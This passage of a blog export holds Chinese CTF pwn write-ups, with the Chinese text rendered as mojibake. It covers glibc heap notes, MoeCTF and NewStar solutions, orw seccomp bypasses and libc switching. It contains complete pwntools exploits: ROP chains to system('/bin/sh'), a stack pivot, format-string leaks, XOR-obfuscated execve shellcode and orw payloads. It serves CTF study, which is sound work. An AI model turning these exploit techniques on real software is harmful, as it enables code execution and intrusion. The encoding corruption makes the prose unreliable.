å¾ˆå¯èƒ½è¿˜åœ¨ CPU ç¼“å­˜ä¸­ï¼Œç´§æŒ¨ç€ B çš„ Last Remainder ä¹Ÿåœ¨ç¼“å­˜ä¸­çš„æ¦‚ç‡å¾ˆé«˜ã€‚ä»è¿™ä¸ªä½ç½®åˆ†é…æ–°çš„å†…å­˜ï¼Œç¼“å­˜å‘½ä¸­ç‡æ›´é«˜ï¼Œé€Ÿåº¦æ›´å¿«ã€‚ mmaped chunk ç‰¹æ€§ æ™®é€šå †å— (brk) MMaped Chunk æ¥æº ä» Top Chunk åˆ†å‰²è€Œæ¥ ç›´æ¥ç”± mmap() ç³»ç»Ÿè°ƒç”¨åˆ›å»º ä½ç½® ä¸»å †åŒºå†… ç‹¬ç«‹çš„å†…å­˜æ˜ å°„åŒº é‡Šæ”¾è¡Œä¸º æ”¾å…¥å„ç±» bin ä¸­ç¼“å­˜ï¼Œå»¶è¿Ÿå½’è¿˜ ç«‹å³ munmap()ï¼Œå½’è¿˜æ“ä½œç³»ç»Ÿ å…ƒæ•°æ®æ ‡å¿— PREV_INUSE (P) ç­‰ IS_MMAPPED (M) å¤§å° é€šå¸¸å°äº mmapé˜ˆå€¼ï¼ˆé»˜è®¤128KBï¼‰ é€šå¸¸å¤§äºç­‰äº mmapé˜ˆå€¼ é€Ÿåº¦ å¿«ï¼ˆæ— ç³»ç»Ÿè°ƒç”¨ï¼‰ æ…¢ï¼ˆéœ€è¦ç³»ç»Ÿè°ƒç”¨ï¼‰ ä¸»è¦å½±å“ å¯èƒ½é€ æˆå †ç¢ç‰‡ ä¿æŒå †æ•´æ´ï¼Œä½†å¯èƒ½æœ‰åœ°å€ç©ºé—´ç¢ç‰‡ 16.04&gt;2.23 18.04&gt;2.27 19.04&gt;2.2 20.04&gt;2.30","categories":[{"name":"heap_study","slug":"heap-study","permalink":"http://example.com/categories/heap-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"MoeCTF 2025","slug":"MoeCTF-2025","date":"2025-08-17T13:20:10.000Z","updated":"2025-09-26T12:19:33.895Z","comments":true,"path":"2025/08/17/MoeCTF-2025/","permalink":"http://example.com/2025/08/17/MoeCTF-2025/","excerpt":"","text":"100find itï¼ˆfdï¼‰ dupå›èµ‹å€¼è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦1çš„åŠŸèƒ½ï¼Œæ‰€ä»¥åœ¨close(1)ä¹‹ååªèƒ½é€šè¿‡dup(1)å¤åˆ¶çš„å€¼3æ¥ä½œä¸ºè¾“å‡ºåˆ°ç»ˆç«¯çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä¼šäº§ç”Ÿæ–°çš„æ–‡ä»¶æè¿°ç¬¦çš„åªæœ‰openå’Œdupç­‰å‡½æ•° writeå’Œreadæ˜¯è°ƒç”¨ä»– æ‰€ä»¥æ¥ä¸‹æ¥ï¼Œopen()å‡½æ•°è¦äº§ç”Ÿæ–°çš„å°çš„æ–‡ä»¶æè¿°ç¬¦æ¥æŒ‡å®šæ–‡ä»¶ä½ç½® ä¹Ÿå°±æ˜¯1 æ‰€ä»¥è„šæœ¬ 1234567891011121314from pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#p = process(&quot;./fd&quot;)p=remote(&quot;192.168.145.1&quot;,20880)sh_shellcode = asm(shellcraft.sh())p.recvuntil(b&quot;I&#x27;ve hidden the fd of stdout. Can you find it?&quot;)p.sendline(b&quot;3&quot;)p.recvuntil(b&quot;You are right.What would you like to see?&quot;)p.sendline(b&quot;flag&quot;)p.recvuntil(b&quot;What is its fd?&quot;)p.sendline(b&quot;1&quot;)p.interactive() è®¤è¯†libc æ¥æ”¶printfçš„åœ°å€ï¼Œç”¨æ¥æ³„éœ²libcåœ°å€ ä½†æ˜¯æŸ¥çœ‹ROPå‘½ä»¤æŸ¥çœ‹elfçš„pop|retå‘ç°ä¸å¤Ÿï¼Œæ‰€ä»¥ç”¨libcæ–‡ä»¶çš„ åŸºå€åŠ ä¸Šåç§»å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥å¯ä»¥æ­£ç¡®æ”¾ç½®å‚æ•° æ„é€ åé—¨å‡½æ•° 123456789101112131415161718192021222324252627from pwn import *context.arch = &#x27;amd64&#x27;context.os = &#x27;linux&#x27;context.log_level = &#x27;debug&#x27;libc = ELF(&quot;./libc.so.6&quot;)elf = ELF(&quot;./libc&quot;)#p=process(&quot;./libc&quot;)p = remote(&quot;192.168.145.1&quot;, 26565)p.recvuntil(&quot;printf&#x27;: 0x&quot;)printf_addr_str = p.recvline().strip()printf = int(printf_addr_str, 16)log.info(&quot;Leaked printf address: &quot; + hex(printf))libc_base = printf - libc.symbols[&quot;printf&quot;]log.success(&quot;Libc base: &quot; + hex(libc_base))rdi=libc_base+0x000000000002a3e5system=libc_base+libc.symbols[&quot;system&quot;]bin=libc_base+0x1d8678p.recvuntil(b&quot;&gt;&quot;)payload = b&quot;A&quot; *72payload+=p64(rdi)+p64(bin)+p64(0x40101a)+p64(system)p.sendline(payload)p.interactive() 150ezpivotæ ˆè¿ç§» æ³¨æ„è¦ç”¨ret*0x100æŠŠæ ˆåœ°å€æŠ¬é«˜ è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python3# -*- coding: utf-8 -*-&quot;&quot;&quot;Basic PWN Template - Normal Template Author: p0ach1lDate: 2025-08-19Target: no description&quot;&quot;&quot;from pwn import *from ctypes import *from LibcSearcher import *from pwnscript import *filename = &quot;./ezpivot&quot;url = &#x27;127.0.0.1:33113&#x27;gdbscript = &#x27;&#x27;&#x27; b * 0x000000000040130B b * 0x000000000040133E&#x27;&#x27;&#x27;set_context(log_level=&#x27;debug&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, timeout=5)p = pr(url=url , filename=filename , gdbscript=gdbscript , framepath=&#x27;&#x27;)elf = ELF(filename)desc = 0x0000000000404060binsh_addr = 0x404880pop_rdi = 0x0000000000401219leave_ret = 0x000000000040133Eret = 0x000000000040133Fsystem_plt = elf.plt[&#x27;system&#x27;]system_addr = 0x000000000401230p.sendlineafter(&quot;length of your introduction.\\n&quot; , b&#x27;-1&#x27;)payload = p64(ret) * 0x100 + p64(pop_rdi) + p64(0x404880) + p64(ret) + p64(system_addr) + b&quot;/bin/sh\\x00&quot;p.sendline(payload)payload = b&#x27;a&#x27; * 0xc + p64(desc - 0x8) + p64(leave_ret)p.sendlineafter(&quot;Now, please tell us your phone number:\\n&quot; , payload)p.interactive() fmtæ‰¾åˆ°ä¸¤ä¸ªå‚æ•°çš„ä½ç½®æ³„éœ²å‡ºæ¥ è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python3# -*- coding: utf-8 -*-&quot;&quot;&quot;Basic PWN Template - Normal Template Author: p0ach1lDate: 2025-08-09Target: no description&quot;&quot;&quot;from pwn import *from ctypes import *from LibcSearcher import *from pwnscript import *filename = &quot;./pwn4&quot;url = &#x27;127.0.0.1:39821&#x27;gdbscript = &#x27;&#x27;&#x27; b * $rebase(0x0000000000001485) b * $rebase(0x00000000000014C4)&#x27;&#x27;&#x27;set_context(log_level=&#x27;debug&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, timeout=5)p = pr(url=url , filename=filename , gdbscript=gdbscript , framepath=&#x27;&#x27;)elf = ELF(filename)payload = b&#x27;%7$s---%10$p----&#x27;p.sendlineafter(&quot;Hey there, little one, what&#x27;s your name?&quot; , payload)p.recvuntil(&quot;Nice to meet you,&quot;)str1 = p.recvuntil(&quot;---&quot; , drop=True)str2 = p.recvuntil(&quot;---&quot; , drop=True).decode()str2 = bytes.fromhex(str2[2:])[::-1].decode(&quot;utf-8&quot;)print(&quot;=======1111&quot; , str1)print(&quot;=======2222&quot; , str2)p.sendlineafter(&quot;I buried two treasures on the stack.Can you find them?\\n&quot; , str2)p.sendlineafter(&quot;Yeah,another one?&quot; , str1)p.interactive() 300call_it è¿˜æœ‰ä¸€ä¸ªgiftå‡½æ•° æ€è·¯ï¼šé€šè¿‡è¾“å…¥0-5ä¹‹å¤–çš„æ•°å¯ä»¥å¢åŠ v2ï¼Œè®©talksæŒ‡å‘gesturesï¼Œå¹¶ä¸”é€šè¿‡if ( !fgets(&amp;talks[16 * v2], 16, stdin) )å»è¾“å…¥è¿™ä¸ªgiftï¼Œè¿™ä¸ªgiftæ˜¯å–å‡ºåé¢ä¸€ä¸ªä½œä¸ºå‚æ•°ï¼Œåœ¨åé¢ä¸€ä¸ªè°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ä¸€ä¾æ¬¡æ”¾å…¥bin&#x2F;shå’Œsystem è¿™é‡Œçœ‹åˆ°ç›¸è·16ä¸ªç©ºä½ è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./111&quot;remote_host = &quot;172.27.29.23&quot;remote_port = 4978libc=ELF(&quot;libc.so.6&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) gdb.attach(p, &quot;b*0x000000000040145E&quot;)def sla(a, b): p.sendlineafter(a, b)def sa(a,b): p.sendafter(a,b)def pr(a,b): print(a+b&quot;===================&quot;+hex(b).encode())def choice(idx , content = &#x27;&#x27;) : p.sendlineafter(&quot;Choose your gesture: &quot; , str(idx)) if 0 &lt; idx &lt; 6 : p.sendlineafter(&quot;What should I say after this gesture? &quot; , content)choice(1 , b&#x27;/bin/sh\\x00\\n&#x27;)for i in range(7) : choice(6)gift = 0x0000000000401231binsh_addr = 0x0000000000404060system_addr = 0x0000000000401228payload = p64(gift) + p64(binsh_addr)choice(1 , payload[:-1])choice(1 , p64(system_addr))choice(0)p.interactive()","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"NewStar2024 pwn","slug":"NewStar2024-pwn","date":"2025-08-15T05:21:14.000Z","updated":"2025-09-03T10:56:22.752Z","comments":true,"path":"2025/08/15/NewStar2024-pwn/","permalink":"http://example.com/2025/08/15/NewStar2024-pwn/","excerpt":"","text":"week2Bad Asm æ‰€ä»¥é€šè¿‡ç¼–å†™æ±‡ç¼–ä»£ç æ¥å†™è¿™æ®µshellcode é€šè¿‡å¼‚æˆ–ç­‰æ“ä½œæ¥ç»•è¿‡ä¸èƒ½æœ‰00ä»¥åŠsyscall æˆ– sysenter æŒ‡ä»¤æ±‡ç¼–ç çš„é™åˆ¶ è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334from pwn import *from Crypto.Util.number import long_to_bytes, bytes_to_longcontext.log_level=&#x27;debug&#x27;context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]ELFpath = &#x27;./pwn&#x27;p = remote(&#x27;192.168.137.1&#x27;, 40273)shellcode=&#x27;&#x27;&#x27;; // ç›®æ ‡: æ‰§è¡Œ execve(&quot;/bin/sh&quot;, 0, 0) çš„ syscallmov rsp, rdi #rspæŒ‡å‘destï¼ˆsellcodeï¼‰çš„å¤´éƒ¨add sp, 0x0848 ; // ç»™ rsp ä¸€ä¸ªåˆæ³•å€¼ï¼Œä½¿ç¨‹åºèƒ½æ­£å¸¸æ‰§è¡Œ push/popï¼Œä»»æ„ä¸€ä¸ªå¯è¯»å†™æ®µå³å¯ï¼Œæˆ‘ä»¬è¿™é‡Œåˆšå¥½æœ‰rdiä¸­å­˜å‚¨çš„ shellcode çš„æ®µçš„èµ·å§‹ä½ç½®ï¼Œæ­£å¥½è¿™ä¸ªæ®µæœ‰è¯»å†™æƒé™ï¼Œå°±ç›´æ¥æ‹¿æ¥åœ¨ 0x848 åç§»çš„ä½ç½®å½“ä½œæ ˆé¡¶äº†ï¼ˆåŠ åç§»æ˜¯ä¸ºäº†é˜²æ­¢æŸäº›æ“ä½œç ´åå†™å…¥çš„ shellcodeï¼‰mov rsi, 0x4028636f2e49226fmov rdx, 0x4040104040204040xor rsi, rdxpush rsi ; // å¼‚æˆ–æ“å‡ºæ¥&#x27;/bin/sh\\x00&#x27;(æ­£å¥½ 8 å­—èŠ‚ï¼Œä¸€ä¸ªå¯„å­˜å™¨èƒ½å­˜ä¸‹) å¹¶ push åˆ°æ ˆä¸Šé¢ã€‚æ­¤æ—¶ rsp æŒ‡å‘çš„å³æ­¤å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½® mov ax, 0x454fxor ax, 0x4040mov rsi, rdiadd sil, 0x40mov [rsi], ax ; // æ“å‡ºæ¥ syscall çš„æœºå™¨ç  0f 05 å¹¶ä¸”æ‹¼æ¥åˆ°å½“å‰ shellcode åé¢ã€‚ mov rdi, rsp ; // è®¾ç½® rdiï¼ŒæŒ‡å‘ä¹‹å‰ push åˆ°æ ˆä¸Šé¢çš„ &#x27;/bin/sh\\x00&#x27;xor rsi, rsixor rdx, rdx ; // è®¾ç½® rsi, rdxxor rax, raxmov al, 59 ; // è®¾ç½® execve çš„ç³»ç»Ÿè°ƒç”¨å·&#x27;&#x27;&#x27;p.sendafter(&quot;Input your Code :&quot;, asm(shellcode).ljust(0x40, b&#x27;\\x90&#x27;))p.interactive() Ez_fmtInverted World æ­¤æ—¶åˆšæ‰§è¡Œcall readå‡½æ•°ï¼Œå› ä¸ºæ˜¯64ä½çš„ç¨‹åºå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨å‡†å¤‡çš„ mov rsi, rax mov edx, 0x512ç­‰ è¿™äº›æŒ‡ä»¤æ˜¯åœ¨ call _readä¹‹å‰æ‰§è¡Œï¼Œå®ƒä»¬å°†å‚æ•°å€¼æ”¾å…¥ç›¸åº”çš„å¯„å­˜å™¨ä¸­ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥è¦å‹å…¥readå‡½æ•°çš„è¿”å›åœ°å€ çœ‹ripçš„åœ°å€ï¼Œåº”ä¸ºè¿™ä¸ªæ˜¯ è®¡ç®—è·ç¦»åº”è¯¥å¡«å……","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"orw","slug":"orw","date":"2025-08-04T08:23:19.000Z","updated":"2025-09-02T09:34:46.729Z","comments":true,"path":"2025/08/04/orw/","permalink":"http://example.com/2025/08/04/orw/","excerpt":"","text":"orwåŸºç¡€orwæ˜¯openã€readå’Œwriteä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨çš„ç¼©å†™ã€‚orw æ”»å‡»æ˜¯ä¸€ç§ç»•è¿‡æ²™ç®±ï¼ˆSandboxï¼‰æˆ–NXä¿æŠ¤çš„æŠ€æœ¯ï¼Œå…¶æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šä¸ç›´æ¥è·å–shellï¼Œè€Œæ˜¯é€šè¿‡è¿™ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨æ¥è¯»å–ç›®æ ‡æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯flagæ–‡ä»¶ï¼‰ï¼Œç„¶åå°†å…¶å†…å®¹æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºï¼Œä»è€Œè·å¾—flagã€‚ ä¼ ç»Ÿçš„ç¼“å†²åŒºæº¢å‡ºæ”»å‡»é€šå¸¸ä¼šå°è¯•æ³¨å…¥ä¸€æ®µ shellcodeï¼Œè¿™æ®µ shellcode çš„ä½œç”¨æ˜¯æ‰§è¡Œ execve(â€œ&#x2F;bin&#x2F;shâ€, NULL, NULL) æ¥è·å–ä¸€ä¸ªäº¤äº’å¼ shellã€‚ç„¶è€Œï¼Œåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹ï¼Œè¿™ç§ä¼ ç»Ÿæ”»å‡»ä¼šå¤±è´¥ï¼š NXï¼ˆNo-eXecuteï¼‰ä¿æŠ¤ï¼šå¦‚æœç¨‹åºçš„æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ï¼Œä½ æ³¨å…¥çš„ shellcode æ— æ³•åœ¨æ ˆä¸Šè¿è¡Œã€‚ seccomp æ²™ç®±ï¼šä¸€äº›ç¨‹åºä¼šä½¿ç”¨ seccompï¼ˆå®‰å…¨è®¡ç®—æ¨¡å¼ï¼‰æ¥é™åˆ¶è¿›ç¨‹å¯ä»¥è°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨ã€‚å¦‚æœ execve è¢«ç¦ç”¨ï¼Œå³ä½¿ä½ æˆåŠŸæ³¨å…¥äº† shellcodeï¼Œå®ƒä¹Ÿæ— æ³•æ‰§è¡Œã€‚ 1open(const char *pathname, int flagsï¼Œmode_t mode); pathname â†’ æ–‡ä»¶è·¯å¾„åœ°å€ï¼ˆæ”¾åœ¨ RDIï¼‰ flags â†’ æ‰“å¼€æ–¹å¼ï¼Œæ¯”å¦‚ 0 è¡¨ç¤º O_RDONLYï¼ˆæ”¾åœ¨ RSIï¼‰ mode â†’ ä¸€èˆ¬è¯»æ–‡ä»¶ä¸ç”¨ï¼Œé»˜è®¤å³å¯ï¼ˆæ”¾åœ¨ RDXï¼‰ 1int openat(int dirfd, const char *pathname, int flags, mode_t mode); dirfd ï¼ˆç›®å½•æ–‡ä»¶æè¿°ç¬¦ï¼‰ pathname ï¼ˆæ–‡ä»¶è·¯å¾„ï¼‰ flags ï¼ˆæ‰“å¼€æ–¹å¼ï¼ŒO_RDONLY &#x2F; O_WRONLY ç­‰ï¼‰ mode ï¼ˆåˆ›å»ºæ–‡ä»¶æ—¶çš„æƒé™ä½ï¼Œopen æ—¶å¯èƒ½ä¸ç”¨ï¼‰ 12ssize_t read(int fd, void *buf, size_t count);ssize_t write(int fd, const void *buf, size_t count); fd â†’ æ–‡ä»¶æè¿°ç¬¦ï¼Œæ¯”å¦‚ open(&quot;/flag&quot;) çš„è¿”å›å€¼ 3ï¼ˆæ”¾åœ¨ RDIï¼‰ buf â†’ å­˜æ”¾&#x2F;è¦å†™ æ•°æ®çš„ç¼“å†²åŒºåœ°å€ï¼ˆæ”¾åœ¨ RSIï¼‰ count â†’ è¯»å–&#x2F;è¾“å‡º çš„å­—èŠ‚æ•°ï¼ˆæ”¾åœ¨ RDXï¼‰ å…·ä½“çš„æ³„éœ²æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯ret2syscallï¼Œç”¨é¢˜ç›®è‡ªå·±çš„æŒ‡ä»¤å»æ“ä½œ è¿˜æœ‰å°±æ˜¯shellcraft,ä½†æ˜¯å®ƒçš„è¦æ±‚ä¼šæ›´é«˜ï¼Œå› ä¸ºå…¶æœ¬è´¨å°±æ˜¯ shellcodeï¼Œä½¿ç”¨å®ƒè¦æ±‚ç›®æ ‡å†…å­˜åŒºåŸŸå¿…é¡» å¯å†™å¯æ‰§è¡Œï¼ˆW+Xï¼‰ è¿˜æœ‰ä¸€ä¸ªsendfileå‡½æ•°,å…¼å…·äº†ORWä¸­readå’Œwriteçš„åŠŸèƒ½ï¼ 1ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count); out_fd è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦ï¼Œé€šå¸¸æ˜¯ socketï¼ˆä¾‹å¦‚å®¢æˆ·ç«¯è¿æ¥çš„å¥—æ¥å­—ï¼‰ã€‚ in_fd è¾“å…¥æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šå¸¸æ˜¯ æ‰“å¼€çš„æ–‡ä»¶ã€‚ offset è¾“å…¥æ–‡ä»¶çš„åç§»é‡æŒ‡é’ˆã€‚ å¦‚æœä¸º NULLï¼Œåˆ™ä½¿ç”¨ in_fd å½“å‰çš„æ–‡ä»¶åç§»é‡ï¼Œå¹¶è‡ªåŠ¨æ›´æ–°ã€‚ å¦‚æœä¸ä¸º NULLï¼Œåˆ™ä»æŒ‡å®šåç§»é‡å¼€å§‹è¯»æ–‡ä»¶ï¼Œä½†ä¸ä¼šä¿®æ”¹ in_fd çš„åç§»é‡ã€‚ count å¸Œæœ›ä¼ è¾“çš„å­—èŠ‚æ•°ã€‚ ä¾‹é¢˜åŸºç¡€ è¿™ä¸ªå°±æ˜¯å…¸å‹çš„orw ç”¨ 1seccomp-tools dump ./orw #æŸ¥çœ‹å…è®¸çš„å‡½æ•°è°ƒç”¨ è„šæœ¬123456789101112131415from pwn import *r = remote(&#x27;node5.buuoj.cn&#x27;,29475)context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;orw&#x27;)shellcode = shellcraft.open(&#x27;/flag&#x27;)shellcode += shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,100)shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)shellcode = asm(shellcode)r.sendline(shellcode)r.interactive() [HGAME 2023 week1]orwé¢˜ç›® å¯ä»¥çœ‹åˆ°ç¦äº†execveå’Œexecveat æ€è·¯ï¼šå…ˆæ³„éœ²libcåŸºåœ°å€ï¼Œ(å¯ä»¥çœ‹åˆ°readè¯»å…¥çš„æ•°é‡æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥å¯ä»¥æŠŠæ³„éœ²putsçš„å†™å…¥ropé“¾åé¢) ä¹‹åleaæŠŠreadçš„è¯»å…¥ä½ç½®åŠ«æŒé“æˆ‘ä»¬å¯¹åº”çš„bssä½ç½®ï¼Œä¹‹ååœ¨è¿™é‡Œæ”¾å…¥orwçš„ç»•è¿‡ï¼Œæœ€åleaveè·³è½¬è¿‡å»è®©å®ƒæ‰§è¡Œå°±å¯ä»¥äº† è„šæœ¬12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./vuln&quot;remote_host = &quot;node5.anna.nssctf.cn&quot;remote_port = 25492libc=ELF(&quot;./libc-2.31.so&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) # gdb.attach(p, &quot;b*0x4012EE&quot;)def sla(a, b): p.sendlineafter(a, b)def ru(a): p.recvuntil(a)def sa(a, b): p.sendafter(a, b)puts_got=elf.got[&quot;puts&quot;]puts_plt=elf.plt[&quot;puts&quot;]lea=0x4012CF ret=0x4012EF rdi=0x401393bss=0x404300 rbp=0x40117dmain=0x4012F0 leave=0x4012EE pay=b&quot;a&quot;*0x108+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)sa(b&quot;Maybe you can learn something about seccomp, before you try to solve this task.\\n&quot;, pay)puts=u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:]+b&quot;\\x00\\x00&quot;)print(b&quot;puts===========================&quot;+hex(puts).encode())libc_base=puts-libc.sym[&quot;puts&quot;]rdx = libc_base + 0x142c92 rsi = libc_base + 0x2601f open=libc_base+libc.sym[&quot;open&quot;]read=libc_base+libc.sym[&quot;read&quot;]write=libc_base+libc.sym[&quot;write&quot;]pay=b&quot;a&quot;*0x100+p64(bss+0x400)+p64(lea)p.recvuntil(&#x27;Maybe you can learn something about seccomp, before you try to solve this task.&#x27;)p.send(pay)pause()pay=b&quot;/flag\\x00\\x00\\x00&quot;pay+=p64(rdi)+p64(bss+0x300)+p64(rsi)+p64(0)+p64(open)pay+=p64(rdi)+p64(3)+p64(rsi)+p64(bss+0x300)+p64(rdx)+p64(0x100)+p64(read)pay+=p64(rdi)+p64(1)+p64(rsi)+p64(bss+0x300)+p64(rdx)+p64(0x100)+p64(write)pay=pay.ljust(0x100,b&#x27;\\x00&#x27;)+p64(bss+0x300)+p64(leave) p.send(pay)p.interactive() XYCTF orw rspåªæƒ³ä¸€ä¸ªæ–°çš„æ ˆç©ºé—´ï¼Œè€Œä¸”è¿™ä¸ªåœ°æ–¹æ˜¯ç”±rdiæ§åˆ¶çš„ï¼Œæˆ‘ä»¬æ„é€ çš„ropé“¾æ— æ³•ä½¿ç”¨ï¼Œæ‰€ä»¥åªèƒ½è‡ªå·±æ‰‹æ“æ±‡ç¼– æœç„¶æ±‡ç¼–ä»£ç æ‰æ˜¯ä¸€åˆ‡çš„åŸºç¡€:candle: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *context(log_level=&#x27;debug&#x27;, arch = &quot;amd64&quot;,os= &#x27;linux&#x27;,terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])p = process(&#x27;./vuln&#x27;)#p = remote(&quot;xyctf.top&quot;,60030 )libc =ELF(&quot;./libc.so.6&quot;)elf = ELF(&#x27;./vuln&#x27;)def convert_str_asmencode(content: str): out = &quot;&quot; for i in content: out = hex(ord(i))[2:] + out out = &quot;0x&quot; + out return out #å°†strè½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ï¼Œå¹¶åœ¨å¼€å¤´è¡¥ä¸Š&quot;0x&quot;if p.recvline()==b&#x27;show your magic again\\n&#x27;: shellcode=f&quot;&quot;&quot; xor rsi,rsi; mov rbx,&#123;convert_str_asmencode(&quot;/flag&quot;)&#125;; push rbx; mov rdx,0; #è®¾ç½®oflagä¸º0 mov r10,0; mov rdi,3; #æ–‡ä»¶æè¿°ç¬¦3 mov rsi,rsp mov eax,257; #openatçš„ç³»ç»Ÿè°ƒç”¨å· syscall; mov rsi,3; #in_fd mov r10,50; #n_bytes xor rdx,rdx; mov rdi,rdx; inc rdi; #out_fd mov eax,40; #sendfileçš„ç³»ç»Ÿè°ƒç”¨å· syscall; mov rdi,0; mov rax,60; #exit syscall &quot;&quot;&quot; payload1 =asm(shellcode) p.send(payload1) p.interactive() æœ¬ç¯‡å‚è€ƒäº†å¸ˆå‚…Duskçš„åšå®¢","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"orw","slug":"orw","permalink":"http://example.com/tags/orw/"}]},{"title":"libcç‰ˆæœ¬åˆ‡æ¢","slug":"libcç¯å¢ƒåˆ‡æ¢","date":"2025-08-02T10:43:25.000Z","updated":"2025-08-26T09:11:04.829Z","comments":true,"path":"2025/08/02/libcç¯å¢ƒåˆ‡æ¢/","permalink":"http://example.com/2025/08/02/libc%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/","excerpt":"","text":"æ›´æ¢libcç‰ˆæœ¬é¦–å…ˆè¦æ‹¿åˆ°å¯¹åº”çš„libc.soæ–‡ä»¶ ç„¶åæŸ¥çœ‹ç‰ˆæœ¬ 1strings libcæ–‡ä»¶å |grep ubuntu ç„¶ååˆ‡æ¢clibcç‰ˆæœ¬ 1libc æ–‡ä»¶å libcç‰ˆæœ¬ä¿¡æ¯ æŸ¥çœ‹libcç‰ˆæœ¬é€šè¿‡gotè¡¨æ³„éœ²libcç‰ˆæœ¬ è¾“å‡ºä¸€ä¸ªå¤–ç½®å‡½æ•°çš„gotè¡¨åœ°å€ ç„¶ååœ¨ç½‘ç«™åŒ¹é…ä¹‹åä¸‹è½½ ä¸‹è½½æ²¡æœ‰çš„libcæ–‡ä»¶ 1https://launchpad.net/ubuntu/+source/glibc/&lt;libcç‰ˆæœ¬&gt; ##ä¾‹å¦‚2.31-0ubuntu9.9 æŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶ä¸‹è½½åˆ°glibc-all-in-oneä¸­çš„debs ç„¶åå»æ‰§è¡Œ 12./extract debs/libc6_2.35-0ubuntu3.10_amd64.deb libs/2.35-0ubuntu3.10_amd64./extract debs/libc6-dbg_2.35-0ubuntu3.10_amd64.deb libs/2.35-0ubuntu3.10_amd64/.debug ç„¶åæŠŠè§£å‹å‡ºæ¥çš„ä¸œè¥¿æ”¾åœ¨å¯¹åº”çš„libcæ–‡ä»¶å¤„å°±å¯ä»¥äº† æˆ‘çš„è·¯å¾„æ˜¯File System&#x2F;&#x2F;lib&#x2F;freelibs&#x2F;å¯¹åº”æ–‡ä»¶å¤¹","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"ciscn_2019_s_3","slug":"ciscn-2019-s-3","date":"2025-08-02T07:50:19.000Z","updated":"2025-09-09T06:11:29.088Z","comments":true,"path":"2025/08/02/ciscn-2019-s-3/","permalink":"http://example.com/2025/08/02/ciscn-2019-s-3/","excerpt":"","text":"é¢˜ç›® æ²¡æœ‰åé—¨å‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰èƒ½ç”¨æ¥æ³„éœ²libcåœ°å€çš„ä¸œè¥¿ ä½†æ˜¯çœ‹åˆ°æœ‰execveå’Œä¸€äº›å¯¹å¯„å­˜å™¨çš„æ“ä½œï¼Œè€ƒè™‘csu åœ¨æ ˆä¸Šå†™å…¥&#x2F;bin&#x2F;sh,ä¹‹åè°ƒç”¨å®ƒ æ•°æ®åœ¨æ ˆçš„ä½ç½®ä¸æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯åç§»æ˜¯å›ºå®šçš„ å¯ä»¥é€šè¿‡readå’Œwriteæ¥æ³„éœ²æ ˆä¸Šçš„åœ°å€ scuæ³„éœ²åœ°å€ 